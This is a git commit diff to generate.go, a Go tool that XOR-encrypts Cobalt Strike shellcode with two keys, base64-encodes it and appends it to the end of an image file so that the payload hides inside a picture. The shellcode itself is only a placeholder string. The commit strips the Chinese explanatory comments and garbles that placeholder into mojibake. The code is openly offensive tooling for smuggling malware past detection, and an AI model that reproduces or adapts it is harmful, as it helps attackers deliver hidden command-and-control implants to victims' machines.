31c2fa4b85465b3ec0fd62eed85713609658094e
Crispr <55953931+crisprss@users.noreply.github.com>
2021-09-21 01:00:18 +0800

    Update generate.go

--- generate.go
+++ generate.go
@@ -13,26 +13,23 @@ const (
 
 func main() {
 	var xor_shellcode []byte
-	xor_shellcode = []byte{"CS生成的Java shellcode"}
+	xor_shellcode = []byte{"CS鐢熸垚鐨凧ava shellcode"}
 	/*xor_shellcode =[]byte{0xfc, 0x48,...}*/
 	var shellcode []byte
 	for i := 0; i < len(xor_shellcode); i++ {
-		//这里将真正的shellcode进行异或加密再给shellcode切片
 		shellcode = append(shellcode, xor_shellcode[i]^KEY_1^KEY_2)
 	}
-	//进行base64加密 准备写入jpeg中
+	
 	encodeBaseStr := base64.StdEncoding.EncodeToString(shellcode)
 	fileName := os.Args[1]
 	if len(fileName) == 0 {
 		fmt.Println("[-]usage:run generate.go pic_path")
 		os.Exit(0)
 	}
-	//创建一个文件并且追加内容
 	f, err := os.OpenFile(fileName, os.O_CREATE|os.O_RDWR|os.O_APPEND, os.ModeAppend|os.ModePerm)
 	if err != nil {
 		fmt.Println(err)
 	}
-	//将异或加密并且base64后的shellcode追加写入到图片最后
 	f.WriteString(encodeBaseStr)
 	f.Close()
 	fmt.Println("write success")
